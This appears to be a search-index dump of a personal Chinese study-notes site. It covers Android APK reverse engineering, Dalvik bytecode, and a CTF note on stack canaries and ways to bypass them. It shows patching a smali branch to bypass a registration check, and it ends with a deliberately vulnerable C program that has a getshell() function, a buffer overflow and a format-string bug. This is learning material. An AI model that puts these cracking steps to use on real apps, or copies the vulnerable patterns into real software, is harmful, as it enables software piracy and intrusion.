[{"id":0,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/","title":"安全技术","section":"Docs","content":"README #  The Note of learning CTF (Capture The Flag) or any security related was placed in this folder. Sort by learing method.\n学习 CTF 或任何与安全（密码学/隐写/WEB攻防等）相关的笔记，通过学习途径分类。\n"},{"id":1,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/","title":"杂项博客","section":"Docs","content":"杂项博客 #  "},{"id":2,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/","title":"理论课程","section":"Docs","content":"README #  Note of learning school class subject was placed in this folder.\n学校的课程的笔记放在这个文件夹中。\n"},{"id":3,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/","title":"算法统计","section":"Docs","content":"算法与统计相关 #  "},{"id":4,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/","title":"软件技术","section":"Docs","content":"README #  The software or framework usage note was placed in this folder.\n一些软件或者框架的使用学习笔记放置于该文件夹中。\n"},{"id":5,"href":"/docs/readme/","title":"Readme","section":"Docs","content":"Introduction #  这里是 shesl 的笔记网站：\n git-repo for note resources: Note git-repo for front pages: GitPages Repo front site: GitPages  关于我：\n 邮件：shesl-meow@qq.com  "},{"id":6,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"1.分析环境搭建","section":"Android逆向分析","content":"Android 程序分析环境搭建 #  Windows 环境搭建 #    安装 JDK。以下命令检测是否安全成功。\n$ java -version   安装 android-sdk。不知道哪次更新之后，这些命令行工具全部集成到了 Android Studio 里面，在 Android Studio 中打开 SDK Manager 就可以安装。\n以下命令检测两个工具是否安装成功：\n$ adb --version Android Debug Bridge version 1.0.39 ... $ emulator -version Android emulator version 28.0.23.0 (build_id 5264690) (CL:be2be19ca0131957449e8c0ded5e55070f9537b0) ...   NOTICE:\n 本书中的环境搭建大多都过时了，开发工具建议直接安装 Android Studio，逆向工具建议直接安装吾爱破解的安装包。  "},{"id":7,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F/","title":"2.如何分析安卓程序","section":"Android逆向分析","content":"如何分析安卓程序 #  第一个安卓程序 #  已经上传至 github：https://github.com/shesl-meow/AndroidReverse.git\n编译生成 .apk 文件，可以直接在 Android Studio 中进行操作。\n破解第一个程序 #  反编译 APK 文件 #  安装 apktool，这是一个 github 的开源软件：https://github.com/iBotPeaches/Apktool\n在 Windows 下，可以直接使用 choco 进行安装：\n\u0026gt; choco install apktool 关于 apktool 的使用教程可以参考：apktool\n分析 APK 文件 #  在目标文件夹下（与开发时的源码目录结构是一样的）：\n smali 目录存放了程序的所有反汇编代码 res 目录下存放了程序中所有的资源文件  以上的 Android 程序的分析步骤：\n  res/values/strings.xml 被加密存储为 resources.arsc，当程序被反汇编成功后这个文件也被解密了出来。\n在这里存储了 Android 程序中存储使用的所有字符串。\n使用以下的命令查找 注册失败 的提示信息：\n$ cat ./res/values/strings.xml | grep 注册错误 \u0026lt;string name=\u0026#34;unsuccess_msg\u0026#34;\u0026gt;注册错误\u0026lt;/string\u0026gt;   所有的字符串都在 gen/\u0026lt;packagename\u0026gt;/R.java 文件的 String 类被表示，每个字符串都有唯一的 int 类型索引值。\n这个索引值经过 apktool 反汇编之后，都保存在与 string.xml 文件同目录下的 public.xml 文件中。\n使用以下命令查找 unsuccess_msg 对应的索引值：\n$ cat ./res/values/public.xml | grep unsuccess_msg \u0026lt;public type=\u0026#34;string\u0026#34; name=\u0026#34;unsuccess_msg\u0026#34; id=\u0026#34;0x7f0b0027\u0026#34; /\u0026gt;   然后在源代码中查找 0x7f0b0027 这个索引值调用的位置：\n$ grep -rwn ./smali/ -e \u0026#34;0x7f0b0027\u0026#34; ./smali/com/example/reversetest/MainActivity$1.smali:97: const v1, 0x7f0b0027 ./smali/com/example/reversetest/R$string.smali:96:.field public static final unsuccess_msg:I = 0x7f0b0027   我们发现实现注册失败的逻辑存在于 MainActivity$1.smali 这个文件中，我们可以继续研究这个文件。暂时看不懂 smali 代码，此处略过。\n  打开任意的文本编辑器。将 if-nez p1, :cond_0 更改为 if-eqz p1, :cond_0。\n  重新编译 apk 文件并签名 #  使用以下的 apktool 命令重新编译 apk 文件：\n$ apktool b outdir 编译生成的 apk 文件还没有签名，不能安装测试，接下来需要使用 apksigner 命令行工具对 apk 文件进行签名（书中的旧版本使用 signapk.jar），使用细节见：apksigner\n（签名之后似乎只是大小变大了）\n通过以下的命令安装 apk 文件（adb 命令使用细节见 adb ）：\n$ adb install testapp.apk "},{"id":8,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"3. Dalvik虚拟机","section":"Android逆向分析","content":"Android Dalvik 虚拟机 #  虽然 Android 平台使用 Java 语言来开发应用程序，但 Android 程序却不是运行在标准 Java 虚拟机上，而是 Dalvik Virtual Machine（Dalvik 虚拟机）。\nDalvik 虚拟机的特点 #  与 Java 虚拟机的区别 #  主要区别：\n  Java 虚拟机运行的是 Java 字节码，Dalvik 虚拟机运行的是 Dalvik 字节码。\n所有的 Dalvik 字节码由 Java 字节码转化而来，并且被打包到一个 DEX（Dalvik Executable）可执行文件中。Dalvik 虚拟机通过解释 DEX 文件来执行这些字节码。\n  Dalvik 可执行文件体积更小。\nAndroid SDK 中有一个叫 dx 的工具负责将 Java 字节码转换为 Dalvik 字节码。\n  Java 虚拟机与 Dalvik 虚拟机架构不同。\nJava 虚拟机基于栈结构。程序在运行时需要频繁地从栈上读取或写入数据。\nDalvik 虚拟机基于寄存器架构。数据的访问通过寄存器间直接传递。\n  实例：\n  编写 Java 程序如下：\n// Hello.java public class Hello { public int foo(int a, int b) { return (a+b) * (a-b); } public static void main(String[] argc) { Hello hello = new Hello(); System.out.println(hello.foo(5,3)); } }   执行以下命令生成 .class 文件：\n$ javac Hello.java 执行以下命令生成 .dex 文件：\n$ dx --dex --output=Hello.dex Hello.class   使用 javap 反编译 Hello.class 查看 foo() 函数的 Java 字节码：\n$ javap -c -classpath . Hello ... public int foo(int, int); Code: 0: iload_1 1: iload_2 2: iadd 3: iload_1 4: iload_2 5: isub 6: imul 7: ireturn ... Java 虚拟机的指令集被称为零地址指令集，是指指令集的目标参数和源参数都是隐含的，它通过 Java 虚拟机中一个称作”求值栈“的数据结构传递。\n完整的 Java 字节码指令列表可以参考维基百科：https://en.wikipedia.org/wiki/Java_bytecode_instruction_listings\n  使用 dexdump 可以查看 Dalvik 字节码，执行以下命令：\n$ dexdump -d Hello.dex ... Virtual methods - #0 : (in LHello;) name : \u0026#39;foo\u0026#39; type : \u0026#39;(II)I\u0026#39; access : 0x0001 (PUBLIC) code - registers : 5 ins : 3 outs : 0 insns size : 6 16-bit code units 000198: |[000198] Hello.foo:(II)I 0001a8: 9000 0304 |0000: add-int v0, v3, v4 0001ac: 9101 0304 |0002: sub-int v1, v3, v4 0001b0: b210 |0004: mul-int/2addr v0, v1 0001b2: 0f00 |0005: return v0 catches : (none) positions : 0x0000 line=3 locals : 0x0000 - 0x0006 reg=2 this LHello; ...   Dalvik 虚拟机是如何执行程序的 #  Dalvik 虚拟机属于 Android 运行时环境，它与一些核心库共同承担 Android 应用程序的运行工作。\n简述：\n  Android 系统启动加载完内核之后，第一个执行的是 init 进程\n它首先要做的是设备的初始化工作，然后读取 inic.rc 文件并启动系统中的重要外部程序 Zygote。\n  Zygote 进程是 Android 所有进程的孵化器进程\n它启动后会首先初始化 Dalvik 虚拟机，然后启动 system_server 并进入 Zygote 模式，通过 socket 等待命令。\n  当执行一个 Android 应用程序时，system_server 进程通过 Binder IPC 方式发送命令给 Zygote，Zygote 收到命令后通过 fork 自身创建一个 Dalvik 虚拟机的实例来执行应用程序的入口函数。\n  当进程 fork 成功后，执行的工作就交给了 Dalvik 虚拟机。\nDalvik 虚拟机首先通过 loadClassFromDex() 函数完成类的装载工作，每个类被成功解析后都会拥有一个 ClassObject 类型的数据结构存储在运行时环境中，虚拟机使用 gDvm.loadedClasses 全局哈希表来存储与查询所有装载进来的类。\n  随后，字节码验证器使用 dvmVerifyCodeFlow() 函数对装入的代码进行校验。\n  接着虚拟机调用 FindClass() 函数查找并装载 main 方法类，随后调用 dvmInterpret() 函数初始化解释器并执行字节码流。\n  Dalvik 虚拟机 JIT（即时编译） #  主流的 JIT 包括两种字节码编译方式：\n method 方式：以函数或方法为单位进行编译； trace 方式：以 trace 为单位进行编译。编译执行比较频繁的 ”热路径“ 代码。  Dalvik 汇编语言基础 #  Dalvik 指令格式 #  一段 Dalvik 汇编代码由一系列 Dalvik 指令组成，指令语法由指令的位描述与指令格式标识来决定。\n位描述的约定如下：\n 每 16 位的字采用空格分隔开来。 每个字母表示 4 位，每个字母按顺序从高字节开始，排列到低字节。 四位的内部可以用 ”|“ 来表示不同的内容。 顺序采用 A~Z 的单个大写字母表示一个 4 位操作码，op 表示一个 8 位操作码。 ”$$\\varnothing$$“ 来表示这个字段的所有位为 0。  例子：”A|G|op BBBB F|E|D|C“\n指令格式的约定如下：\n 指令格式标识大多由三个字符组成，前两个是数字，最后一个是字母； 第一个数字是表示指令有多少个 16 位的字组成； 第二个数字是表示指令最多使用寄存器的个数。特殊标记 ”r“ 标识使用一定范围内的寄存器。 第三个字母表示类型码，表示指令用到的额外数据的类型；可能值如下表所示：     助记符 位大小 说明     b 8 8 位有符号立即数   c 16, 32 常量池索引   f 16 接口常量（仅对静态链接格式有效）   h 16 有符号立即数（32 位或 64 位数的高位值，低位为 0）   i 32 立即数，有符号整数或 32 位浮点数   l 64 立即数，有符号整数或 64 位双精度浮点数   m 16 方法常量（仅对静态链接格式有效）   n 4 4 位立即数   s 16 短整形立即数   t 8, 16, 32 跳转、分支   x 0 无额外数据    最新的 Dalvik 字节码 Reference：https://source.android.com/devices/tech/dalvik/dalvik-bytecode\n另外，Dalvik 对语法做了一些额外的说明：\n  每个指令以命名的操作码开始，后面可选择使用一个或多个参数，并且参数之间用逗号分隔。\n  每条指令的参数从指令的第一部分开始，op 位于低 8 位，高 8 位可以是一个 8 位的参数，也可以是两个 4 位的参数，也可以为空；如果指令超过 16 位，则后面的部分依次作为参数。\n  命名寄存器的参数形式为“vX”，比如：v0, v1。选择“v”而不是更常用的“r”作为前缀，是因为这样可避免与可能会在其上实现 Dalvik 可执行格式的（非虚拟）架构（其寄存器使用“r”作为前缀）出现冲突。\n（也就是说，我们可以直截了当地同时讨论虚拟和实际寄存器。）\n  表示字面量、常数的参数形式为“#+X”。有些格式表示高阶位仅为非零位的字面量；对于这种类型的字面量，在语法表示时会明确写出后面的 0，但是在按位表示时这些 0 会被省略。\n  表示相对指令地址偏移量的参数形式为“+X”。\n  表示字面量常量池索引的参数形式为“kind@X”，其中“kind”表示正在引用的常量池。每个使用此类格式的操作码明确地表示只允许使用一种常量；请查看操作码参考，找出对应关系。\n常量池的种类包括“string”（字符串池索引）、“type”（类型池索引）、“field”（字段池索引） 、“meth” （方法池索引）和“site”（调用点索引）。\n  DEX 文件反汇编工具 #  目前 DEX 可执行文件主流的反汇编工具有 BakSmali 和 Dedexer。\n测试代码使用之前的 Hello.java，使用下面的命令编译生成 dex 文件：\n$ javac Hello.java $ dx --dex --output=Hello.dex Hello.class   使用 baksmali.jar 通过以下的命令反汇编 Hello.dex（bakmali 的使用方法与书本描述不一样，详细使用方法可以hi使用 java -jar baksmali.jar help 查看更加详细的使用方法）：\n$ java -jar baksmali.jar dis -o baksmaliout Hello.dex $ cat baksmaliout/Hello.smali ... # virtual methods .method public foo(II)I .registers 5 .prologue .line 3 add-int v0, p1, p2 sub-int v1, p1, p2 mul-int/2addr v0, v1 return v0 .end method 该命令成功执行后，会生成 baksmali/Hello.smali 文件。\n  使用 ddx.jar 通过以下的命令反汇编 Hello.dex：\n$ java -jar ddx.jar -d ddxout Hello.dex $ cat ddxout/Hello.ddx ... .method public foo(II)I add-int\tv0,v3,v4 sub-int\tv1,v3,v4 mul-int/2addr\tv0,v1 return\tv0 .end method 命令执行成功后，会生成 ddxout/Hello.ddx 文件。\n  两种反汇编代码的结构组织是一样的，在方法名、字段类型与代码指令序列上它们保持已知，具体表现在一些语法细节上：\n 前者使用 .registers 指令指定函数用到的寄存器数目，后者则在 .registers 之前加了 limit 前缀； 前者使用 p0 做 this 引用，后者则使用 v2 做 this 引用； 前者使用 .parameter 指定参数，后者则使用 parameter 数组 指定参数； 前者使用 .prologue 做函数代码的起始位置，后者没有； 前者使用 p 命名法命名寄存器，后者使用 v 命名法命名寄存器。    Dalvik 寄存器 #   ANDROID 源码可以在以下网址查看：https://android.googlesource.com\nGITHUB 上有源码的镜像：https://github.com/aosp-mirror\n  Dalvik 源码可以使用以下的命令下载最新版本（官网总是 Timeout）：\n$ git clone --depth=1 https://github.com/aosp-mirror/platform_dalvik.git dalvik $ cd dalvik $ git fetch --depth=1 origin gingerbread:gingerbread # 书本上的源码讲的是 gingerbread 这个分支的源码  Dalvik 虚拟机基于寄存器架构，在设计之初采用了 ARM 架构（CPU 本身集成了多个寄存器）。\nDalvik 虚拟机如何虚拟地使用寄存器呢？\n  每个函数在函数头声明其使用的寄存器数量，虚拟机执行到这个函数时，根据其寄存器的数目分配适当的栈空间，用来存放寄存器实际的值；\n  虚拟机通过处理字节码，对寄存器进行读写操作就是在写栈空间，Android SDK 中有一个名为 dalvik.bytecode.Opcodes 的接口，它定义了一份完整的 Dalvik 字节码列表\n处理这些字节码的函数为一个宏 HANDLE_OPCODE()，处理过程函数可以在 Android 源代码 dalvik/vm/mterp/c 中找到。\n  下面以 OP_MOVE.cpp 举例：\n// vm/mterp/c/OP_MOVE.cpp HANDLE_OPCODE($opcode /*vA, vB*/) vdst = INST_A(inst); vsrc1 = INST_B(inst); ILOGV(\u0026#34;|move%s v%d,v%d %s(v%d=0x%08x)\u0026#34;, (INST_INST(inst) == OP_MOVE) ? \u0026#34;\u0026#34; : \u0026#34;-object\u0026#34;, vdst, vsrc1, kSpacing, vdst, GET_REGISTER(vsrc1)); SET_REGISTER(vdst, GET_REGISTER(vsrc1)); FINISH(1); OP_END   vdst = INST_A(inst); vsrc1 = INST_B(inst); INST_A 表示用来获取 vA 寄存器地址的宏，其中 A 表示寄存器的”名称“，可以是其他的字母或长度。在该文件的同目录下的 headers.cpp 文件 300~304 中，INST_A 与 INST_B 的声明如下：\n/* * Extract the \u0026#34;vA, vB\u0026#34; 4-bit registers from the instruction word (_inst is u2). */ #define INST_A(_inst) (((_inst) \u0026gt;\u0026gt; 8) \u0026amp; 0x0f) #define INST_B(_inst) ((_inst) \u0026gt;\u0026gt; 12) 也就是说，vdst 获取了 _inst 高 8 位的低 4 位的值；vsrc1 获取了 _inst 的最高 4 位。\n  ILOGV(\u0026#34;|move%s v%d,v%d %s(v%d=0x%08x)\u0026#34;, (INST_INST(inst) == OP_MOVE) ? \u0026#34;\u0026#34; : \u0026#34;-object\u0026#34;, vdst, vsrc1, kSpacing, vdst, GET_REGISTER(vsrc1)); 用来输出调试信息。\n  SET_REGISTER(vdst, GET_REGISTER(vsrc1)); SET_REGISTER 用来设置寄存器的值，GET_REGISTER 用来获取寄存器的值（操作的寄存器可以是其它的大小与类型，比如 WIDE 类型相关的宏函数则是 GET_REGISTER_WIDE）。在 headers.cpp 文件，声明如下：\n# define GET_REGISTER(_idx) \\ ( (_idx) \u0026lt; curMethod-\u0026gt;registersSize ? \\ (fp[(_idx)]) : (assert(!\u0026#34;bad reg\u0026#34;),1969) ) # define SET_REGISTER(_idx, _val) \\ ( (_idx) \u0026lt; curMethod-\u0026gt;registersSize ? \\ (fp[(_idx)] = (u4)(_val)) : (assert(!\u0026#34;bad reg\u0026#34;),1969) ) fp 为 ARM 栈帧寄存器，在虚拟机运行到某个函数时指向函数的局部变量区，其中就维护着一份寄存器值的列表。\n  v 命名法与 p 命名法 #  假设一个函数有 M 个寄存器和 N 个参数，则寄存器命名法如下表所示：\n   v 命名法 p 命名法 寄存器含义     v0 v0 第 1 个局部变量寄存器   v1 v1 第 2 个局部变量寄存器   \u0026hellip; \u0026hellip; 。。。   v{M-N} p1 第 1 个参数寄存器   \u0026hellip; \u0026hellip; 。。。   v{M-1} p{N-1} 第 N 个寄存器    类型、方法与字段表示方法 #    类型。\nDalvik 字节码只有两种类型，基本类型和引用类型。Dalvik 使用这两种类型来表示 Java 语言的全部类型，除了对象和数组是引用对象类型之外，其他的 Java 类型全都是基本类型。全部的类型列表如下：\n 对于 32 位的类型来说，一个寄存器就可以存放该类型的值；而像 J、D 这样等 64 位的类型则是用两个响铃的寄存器来存储的，比如 v0 和 v1。 L 类型可以表示 Java 中的任何类，这些类在 Java 代码中以 package.name.ObjectName 方式引用，在 Dalvik 汇编代码中，以 Lpackage/name/ObjectName; 形式表示（注意最后有个分号） [ 类型表示所有基本类型的数组，[ 后面紧跟基本类型描述符，比如 [I 表示一个整型一位数组、[[I 表示 int[][]。 [ 和 L 同时使用就可以表示对象数组。    方法。\nDalvik 使用方法名、类型参数与返回值来详细描述一个方法。方法格式例子如下：\nLpackage/name/Objectname;-\u0026gt;MethodName(III)Z\r  Lpackage/name/Objectname; 表示一个类型；\n  MethodName 表示方法名；\n  III 表示方法的参数，在此位三个整形参数；\n  Z 表示方法的返回类型，Z 为 boolean 类型。\nBakSmali 生成的方法代码以 .method 指令开始，以 .end method 指令结束，根据生成的方法类型不同，在方法指令开始前会用 ”#“ 加以解释。如：# virtual methods 表示这是一个虚方法。\n    字段。方法格式例子如下：\nLpackage/name/ObjectName-\u0026gt;FieldName:Ljava/lang/Strng;\r字段由类型（Lpackage/name/ObjectName;）、字段名（FieldName）与字段类型（Ljava/lang/String;）组成。其中后两者用 : 隔开。\nBakSmali 生成的方法代码以 .field 指令开头，根据生成的方法类型不同，在方法指令开始前会用 \u0026ldquo;#\u0026rdquo; 加以解释。比如：# instance field 表示这是一个实例字段。\n  Dalvik 指令集 #  指令特点 #  Dalvik 指令在调用格式上模仿了 C 语言的调用约定。Dalvik 指令的语法与助记符有以下特点：\n  参数采用从目标（destination）到源（source）的方式；\n  根据字节码的大小与类型不同，一些字节码添加了名称后缀以消除歧义：\n  32 位没有后缀；\n  64 位常规类型的字节码添加 -wide 后缀；\n  特殊类型的字节码根据具体类型添加后缀。\n可能值为： -boolean、-byte、-char、-short、-int、-long、-float、-double、-object、-string、-class、-void。\n    根据字节码的布局与选项不同，一些字节码添加了字节码后缀以消除歧义。这些后缀通过在字节码主名称后添加 / 来分隔。\n  在指令集的描述中，宽度值中的每个字母表示宽度为 4 位。\n  比如这样一个指令：move-wide/from16 vAA vBBBB\n move 表示基础字节码（base opcode）：标识这是基本操作； wide 为名称后缀（name suffix）：标识数据宽度是 64； from16 为字节码后缀（opcode suffix）：标识操作源是一个 16 位的寄存器引用常量； vAA 为目的寄存器，始终在源之前，表示 8 位，取值范围是 v0~v255； vBBBB 为源寄存器，表示 16 位，取值范围是 v0~v65535。  注意：\nDalvik 虚拟机中的每个虚拟机都是 32 位的，描述指令中说的位数表示下标取值范围。\n指令 #    空指令：助记符为 nop，它的值为 00，无实际用途。\n  数据操作指令：数据操作指令为 move。指令原型为 move destination source，会根据字节码的大小与类型不同，后面会跟上不同的后缀。\n  返回指令：函数结尾运行的最后一条指令。它的基础字节码为 return，共有以下四条指令：\n return-void 表示函数从一个 void 方法返回； return vAA 表示函数返回一个 32 位非对象类型的值； return-wide vAA 表示函数返回一个 64 位费对象类型的值； return-object vAA 表示函数返回一个对象类型的值；    数据定义指令：用来定义程序中用到的常量、字符串、类等数据。它的基础字节码为 const。\n比如：const-wide/16 vAA, #+BBBB 表示将 16 位的数字扩展为 64 位后赋值给寄存器 vAA。\n  锁指令：Dalvik 中有两条锁指令：monitor-enter vAA 为指定的对象获取锁，monitor-exit vAA 释放指定对象的锁。\n  实例操作指令：与实例操作相关的操作包括类型转换、检查与新建等。\n check-cast vAA, type@BBBB：将 vAA 寄存器中的对象转换为指定的类型，如果失败会抛出 ClassCastException 异常。 instance-of vA, vB, type@CCCC：判断 vB 寄存器中的对象是否可以转换为指定的类型，如果可以则将寄存器 vA 赋值为 1，否则赋值为 0。 new-instance vAA, type@BBBB：构造一个指定类型对象的新实例，并将对象引用赋值给 vAA 寄存器，类型符 type 指定的类型不能是数组类型。    数组操作指令：包括获取数组长度、新建数组、数组赋值、数组元素取值与赋值等操作。\n  异常指令：Dalvik 中用 throw vAA 指令来抛出 vAA 寄存器中的异常。\n  跳转指令：Dalvik 指令集中有三种跳转指令：无条件跳转（goto）、分支跳转（switch）与条件跳转（if）\n  比较指令：它的格式为 cmpkind vAA, vBB, vCC，其中 vBB 与 vCC 是两个待比较的寄存器对，vAA 是存放比较结果的寄存器。\n  字段操作指令：字段操作指令用来对对象实例的字段进行读写操作。字段的类型可以是 Java 中有效的数据类型。\n对普通字段和静态字段有两种指令集：iinstanceop vA,vB, field@CCCC 与 sstaticop vAA, field@BBBB；\n普通字段指令的前缀为 i，比如普通字段读操作 iget，写操作 iput；\n静态字段指令前缀为 s，比如静态字段读操作 sget，写操作 sput。\n  方法调用指令：负责调用类实例的方法，它的基础指令为 invoke，方法调用指令有 invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB 与 invoke-kind/range {vCCCC ... vNNNN}, meth@BBBB 两类。两类指令在作用上并无不同，只是后者使用了 range 来指定寄存器的范围。\n  数据转换指令：用于将一种类型的数值转换为另一种类型。它的格式为 unop vA, vB。vB 中存放着需要转换的数据，转换后的结果保存在 vA 中。\n  数据运算指令：包括算术运算（加、减、乘、除、模、移位等）与逻辑运算（与、或、非、异或等）\n  "},{"id":9,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/4.android%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/","title":"4. Android可执行文件","section":"Android逆向分析","content":"Android 可执行文件 #  Android 程序的生成步骤 #  Google 提供了 Android SDK 供程序员来开发 Android 平台的软件。每个软件在最终发布时会打包成一个 apk 文件，将 apk 文件 传送到 Android 设备中运行即可安装。\n"},{"id":10,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.1.stackoverflow/1.canary/","title":"1. Canary","section":"7.1.StackOverflow","content":" 学习资料：\n https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/ https://blog.csdn.net/Virtual_Func/article/details/48789947 http://blog.fourthbit.com/2014/12/23/traffic-analysis-of-an-ssl-slash-tls-session  学习内容：\n Linux-Pwn，安全保护机制   Canary #  由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。\n PostScript：glibc：The GNU C Library, commonly known as glibc, is the GNU Project\u0026rsquo;s implementation of the C standard library.  原理 #  canary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。\nPostScript：gcc 中使用：\n$ gcc -fstack-protector test.c # 启用保护，不过只为局部变量中含有数组的函数插入保护 $ gcc -fstack-protector-all test.c # 启用保护，为所有函数插入保护 $ gcc -fstack-protector-strong test.c $ gcc -fstack-protector-explicit test.c # 只对有明确stack_protect attribute的函数开启保护 $ gcc -fno-stack-protector test.c # 禁用保护 实现原理 #  开启 Canary 保护的 stack 结构大概如下：\n当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：\nmov rax, qword ptr fs:[0x28]\rmov qword ptr [rbp - 8], rax\r在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果抑或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。\nmov rdx,QWORD PTR [rbp-0x8]\rxor rdx,QWORD PTR fs:0x28\rje 0x4005d7 \u0026lt;main+65\u0026gt;\rcall 0x400460 \u0026lt;__stack_chk_fail@plt\u0026gt;\r这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (stack smash)。\n进一步来说，对于 Linux 来说，fs 寄存器实际上指向的是当前函数栈的 TLS 结构中的 stack_guard，该值由函数 security_init 进行初始化。初始化的值由 glibc 计算，在进入函数的时候就写入了 Kernel 中。\nPostScript：\n  GOT (Global Offset Table)：是一个存储在数据区的地址表。当被执行程序试图寻找编译时未知的全局变量时，程序就会寻找这个表。\n  延迟绑定：即函数第一次被用到时才进行绑定。通过延迟绑定大大加快了程序的启动速度。而 ELF 则使用了PLT (Procedure Linkage Table) 的技术来实现延迟绑定。\n  TSL (Transport Layer Security)：前身是现在已经弃用的 SSL (Secure Sockets Layer)，指的是通过计算机网络提供通信安全性的加密协议。详细的概论信息可参见：SSL/TLS Session。一般的协议结构如下图所示：\n可见 TLS/SSL 协议是介于应用层与传输层之间的协议。下图解释了建立一个 SSL Record 的过程：\ngraph TB;\rD1{Data}\rsubgraph 1.Fragment Data; D2[\u0026quot;|......|\u0026quot;]; end\rsubgraph 2.Compress Data \u0026lt;通常不会有压缩操作\u0026gt;;\rD3[\u0026quot;|......|MAC|\u0026lt;br\u0026gt;Add Message Authentication Code\u0026quot;];\rend\rsubgraph 3.Encrypt data; D4[\u0026quot;|..........|\u0026lt;br\u0026gt;cipher text\u0026quot;]; end\rsubgraph 4.Add header; D5[\u0026quot;|header|...........|\u0026lt;br\u0026gt;TLS record header.\u0026quot;]; end\rD1--\u0026gt;D2; D2--\u0026gt;D3; D3--\u0026gt;D4; D4--\u0026gt;D5\r较高层则完成 Handshake, Change Cipher Spec, Alert, Application Data 这样四项任务。\n其中握手的过程可以用以下的方式来表示：\nTLS Handshake +-----+ +-----+ | | | | | | ClientHello | | | o----------------------------\u0026gt; | | | | | | CLIENT | | ServerHello | | SERVER | | [Certificate] | | | | [ServerKeyExchange] | | | | [CertificateRequest] | | | | ServerHelloDone | | | | \u0026lt;----------------------------o | | | | | | | [Certificate] | | | | ClientKeyExchange | | | | [CertificateVerify] | | | | ** ChangeCipherSpec ** | | | | Finished | | | o----------------------------\u0026gt; | | | | | | | | ** ChangeCipherSpec ** | | | | Finished | | | | \u0026lt;----------------------------o | | | | | +-----+ +-----+   Experiment：\n尝试以下的 C 语言程序：\n// test_canary.c int func(){ int a[20]; return a[0]; } int main(){ func(); return 0; } 使用以下的命令编译该程序生成 ELF 可执行文件：\n$ gcc -fstack-protector-all -o test_canary test_canary.c 使用 gdb 的 -ex 特性查看生成的可执行文件中 func 函数的汇编代码（也可以使用 objdump -d）：\n$ gdb -batch -ex \u0026#39;file test_canary\u0026#39; -ex \u0026#39;disas func\u0026#39; Dump of assembler code for function func: 0x000000000000066a \u0026lt;+0\u0026gt;:\tpush %rbp 0x000000000000066b \u0026lt;+1\u0026gt;:\tmov %rsp,%rbp 0x000000000000066e \u0026lt;+4\u0026gt;:\tsub $0x60,%rsp 0x0000000000000672 \u0026lt;+8\u0026gt;:\tmov %fs:0x28,%rax 0x000000000000067b \u0026lt;+17\u0026gt;:\tmov %rax,-0x8(%rbp) 0x000000000000067f \u0026lt;+21\u0026gt;:\txor %eax,%eax 0x0000000000000681 \u0026lt;+23\u0026gt;:\tmov -0x60(%rbp),%eax 0x0000000000000684 \u0026lt;+26\u0026gt;:\tmov -0x8(%rbp),%rdx 0x0000000000000688 \u0026lt;+30\u0026gt;:\txor %fs:0x28,%rdx 0x0000000000000691 \u0026lt;+39\u0026gt;:\tje 0x698 \u0026lt;func+46\u0026gt; 0x0000000000000693 \u0026lt;+41\u0026gt;:\tcallq 0x540 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x0000000000000698 \u0026lt;+46\u0026gt;:\tleaveq 0x0000000000000699 \u0026lt;+47\u0026gt;:\tretq End of assembler dump. 可以看到它在 *func+8 的位置在函数栈中加入了 canary。在 *func+30 与 *func+39 的位置会检测 canary 是否发生了改变，并在发生错误时延迟绑定（在 plt 段）了 gibc 函数 \u0026lt;__stack_chk_fail\u0026gt;。\n绕过技术 #  泄漏栈中的 Canary #  Canary 设计为以字节 \\x00 结尾，本意是为了保证 Canary 可以截断字符串。\n泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。\nExperiment：\n存在漏洞的示例源代码如下：\n// ex2.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;void getshell(void) { system(\u0026#34;/bin/sh\u0026#34;); } void init() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void vuln() { char buf[100]; for(int i=0;i\u0026lt;2;i++){ read(0, buf, 0x200); printf(buf); } } int main(void) { init(); puts(\u0026#34;Hello Hacker!\u0026#34;); vuln(); return 0; } 